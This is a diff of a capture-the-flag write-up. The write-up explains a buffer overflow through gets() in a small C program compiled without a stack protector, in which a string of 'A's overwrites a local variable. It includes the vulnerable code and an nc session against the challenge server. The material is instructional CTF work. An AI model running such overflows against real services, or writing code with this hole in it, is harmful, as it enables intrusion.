@@ -4,7 +4,7 @@ We also notice that if `x!=0`, the code will exit the "infinite" loop:
 
 ```C
 int main() {
-    while(1) {
+    while(1) { // seems to be an infinite loop
         int x = 0;
         char name[32]="";
         printf("What's your name? ");
@@ -31,7 +31,7 @@ But how can we set x to something different from 0 **in a compiled program**?
 
 When we compile this using `gcc main.c -o main -std=c99 -fno-stack-protector -z execstack -no-pie`, we actually get a hint:
 
-```bash
+```C
 main.c: In function ‘main’:
 main.c:13:9: warning: ‘gets’ is deprecated [-Wdeprecated-declarations]
    13 |         gets(name);
@@ -50,7 +50,7 @@ If we search the internet, we find out that `gets` is unsafe since it doesn't ch
 
 So, if we provide a string long enough to override x (but short enough to not override other important variables that will crash the program), we'll successfully retrieve the flag:
 
-```bash
+```ShellSession
 vianuhack@computer:~$ nc 164.92.224.165 1337
 What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
